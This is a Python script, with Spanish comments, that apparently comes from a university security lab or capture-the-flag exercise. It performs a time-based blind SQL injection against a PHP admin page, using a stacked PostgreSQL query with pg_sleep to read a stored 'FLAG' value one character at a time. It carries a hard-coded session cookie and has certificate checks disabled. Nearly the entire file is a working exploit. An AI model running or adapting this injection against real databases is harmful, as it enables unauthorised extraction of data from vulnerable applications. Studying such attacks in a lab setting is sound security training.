import requests
import sys
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


if len(sys.argv) == 2:
    answer = sys.argv[1]
    iteracion = len(answer)+1
else:
	answer = ""
	iteracion = 1

url = 'https://grupo07-sh8.lab4.cc5327.xor.cl/'

cookies = dict(PHPSESSID='0d4781a01343b08642776b814b7ec82f')

print("--------Iniciando el hackeo-----------------")
caracteres = "qwertyuiopasdfghjklñzxcvbnmQWERTYUIOPASDFGHJKLÑZXCVBNM1234567890"
consulta = "comida' WHERE nombre='platodeldia'; SELECT CASE when (SELECT 1 FROM configuraciones WHERE nombre = 'FLAG' and valor like '{}%') = 1  then pg_sleep(30) else pg_sleep(0) end --"




while True:
	print("-----------------Begin iteracion {} -----------------".format(iteracion))
	t_actual = 0
	c_actual = ""
	for i in caracteres:
		print("voy en la {} de la iteracion {}".format(i,iteracion))
		try:
			r = requests.post('https://grupo07-sh8.lab4.cc5327.xor.cl/admin.php', data={'plato_del_dia': consulta.format(answer+i)}, cookies=cookies,verify=False)
			t = r.elapsed.total_seconds()
			if t > t_actual and t>30:
				print("tiempo {} y letra {}".format(t,i))
				t_actual = t
				c_actual = i
		except:
			print("SE DEMORO MAS DE X SEGUNDOS")
			sys.exit()
	if t_actual==0:
		print("No se encontro mas letras")
		print("--------Fin del hackeo-----------------")
		break

	print("-----------------END iteracion {} -----------------".format(iteracion))

	iteracion+=1
	answer+=c_actual

	print(t_actual)
	print(c_actual)
	print(answer)

print("La flag es {}".format(answer))
print("Tiene largo {}".format(len(answer)))






